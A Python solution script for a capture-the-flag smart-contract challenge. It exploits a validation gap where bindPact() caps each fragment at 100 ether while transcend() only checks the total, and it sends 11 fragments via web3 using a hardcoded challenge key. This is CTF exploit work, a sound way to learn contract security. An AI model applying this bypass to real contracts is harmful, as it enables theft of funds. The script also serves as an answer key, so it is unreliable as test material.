#!/usr/bin/env python3
"""
Solution for Convergence Challenge

Vulnerability: The bindPact() validation checks each fragment's essence individually
(must be <= 100 ether), but transcend() requires TOTAL essence >= 1000 ether.

Exploit: Create 11 SoulFragments with 100 ether each = 1100 ether total
- Each fragment passes the 100 ether limit in bindPact()
- Total essence exceeds 1000 ether requirement in transcend()

Steps:
1. Register as a seeker
2. Create pact data with 11 fragments (100 ether each)
3. Call bindPact() to chronicle the pact
4. Call transcend() with the same data to ascend
"""

from web3 import Web3
from eth_account import Account
from eth_abi import encode

# Configuration
RPC_URL = "http://challenges.1pc.tf:35600/d1bcbad4-12ee-4baa-a7c3-487777d9d24f"
PRIVATE_KEY = "7437caf5c55d91a80d79e375aa0a0833d4d2daa3ef62f0a2aef5bd6ffb4c5e15"
SETUP_ADDR = "0x6E0d966f1B8b6481FB20414aFfF6b554CdEECf22"

# Connect to network
w3 = Web3(Web3.HTTPProvider(RPC_URL))
account = Account.from_key(PRIVATE_KEY)
player_address = account.address

print(f"[+] Connected to RPC: {RPC_URL}")
print(f"[+] Player address: {player_address}")
print(f"[+] Balance: {w3.eth.get_balance(player_address) / 10**18} ETH")

# ABIs
SETUP_ABI = [
    {"inputs": [], "name": "challenge", "outputs": [{"type": "address"}], "stateMutability": "view", "type": "function"},
    {"inputs": [{"name": "agreement", "type": "bytes"}], "name": "bindPact", "outputs": [], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [], "name": "isSolved", "outputs": [{"type": "bool"}], "stateMutability": "view", "type": "function"},
]

CHALLENGE_ABI = [
    {"inputs": [], "name": "registerSeeker", "outputs": [], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [{"name": "truth", "type": "bytes"}], "name": "transcend", "outputs": [], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [], "name": "ascended", "outputs": [{"type": "address"}], "stateMutability": "view", "type": "function"},
    {"inputs": [{"name": "", "type": "address"}], "name": "seekers", "outputs": [{"type": "bool"}], "stateMutability": "view", "type": "function"},
]

# Get contract instances
setup = w3.eth.contract(address=SETUP_ADDR, abi=SETUP_ABI)
challenge_address = setup.functions.challenge().call()
print(f"[+] Challenge contract: {challenge_address}")

challenge = w3.eth.contract(address=challenge_address, abi=CHALLENGE_ABI)

def send_tx(func, description):
    """Helper to send a transaction"""
    print(f"\n[*] {description}")
    tx = func.build_transaction({
        'from': player_address,
        'nonce': w3.eth.get_transaction_count(player_address),
        'gas': 3000000,
        'gasPrice': w3.eth.gas_price,
    })
    signed_tx = account.sign_transaction(tx)
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
    print(f"    Tx hash: {tx_hash.hex()}")
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"    Gas used: {receipt['gasUsed']}")
    print(f"    Status: {'Success' if receipt['status'] == 1 else 'Failed'}")
    if receipt['status'] != 1:
        print(f"    Transaction failed!")
    return receipt

# Step 1: Register as a seeker (if not already)
print("\n" + "="*60)
print("STEP 1: Register as seeker")
print("="*60)
is_seeker = challenge.functions.seekers(player_address).call()
if not is_seeker:
    send_tx(challenge.functions.registerSeeker(), "Registering as seeker")
else:
    print("[+] Already registered as seeker")

# Step 2: Create the pact data
print("\n" + "="*60)
print("STEP 2: Prepare soul pact data")
print("="*60)

# Create 11 SoulFragments with 100 ether each = 1100 ether total
# SoulFragment structure: (address vessel, uint256 essence, bytes resonance)
fragments = []
for i in range(11):
    fragment = (
        player_address,  # vessel
        100 * 10**18,    # essence (100 ether)
        b''              # resonance (empty bytes)
    )
    fragments.append(fragment)

# Encode the pact: (SoulFragment[], bytes32, uint32, address, address)
# The last two addresses are binder and witness (both must be player)
# Proper eth_abi encoding with tuple type
pact_data = encode(
    ['(address,uint256,bytes)[]', 'bytes32', 'uint32', 'address', 'address'],
    [
        fragments,                                    # SoulFragment[] 
        b'\x00' * 32,                                # bytes32 (dummy)
        0,                                           # uint32 (dummy)
        player_address,                              # binder (must be player)
        player_address                               # witness (must be player for transcend)
    ]
)

print(f"[+] Created pact with {len(fragments)} fragments")
print(f"[+] Total essence: {len(fragments) * 100} ether")
print(f"[+] Pact data length: {len(pact_data)} bytes")

# Step 3: Chronicle the pact using bindPact()
print("\n" + "="*60)
print("STEP 3: Chronicle the pact")
print("="*60)
send_tx(setup.functions.bindPact(pact_data), "Calling bindPact() to chronicle")

# Step 4: Transcend using the same pact data
print("\n" + "="*60)
print("STEP 4: Transcend to ascension")
print("="*60)
send_tx(challenge.functions.transcend(pact_data), "Calling transcend() with chronicled truth")

# Verify solution
print("\n" + "="*60)
print("VERIFICATION")
print("="*60)
ascended = challenge.functions.ascended().call()
print(f"[+] Ascended address: {ascended}")

is_solved = setup.functions.isSolved().call()
print(f"[+] Challenge solved: {is_solved}")

if is_solved and ascended == player_address:
    print("\n🎉 SUCCESS! You have transcended!")
else:
    print("\n❌ Something went wrong...")
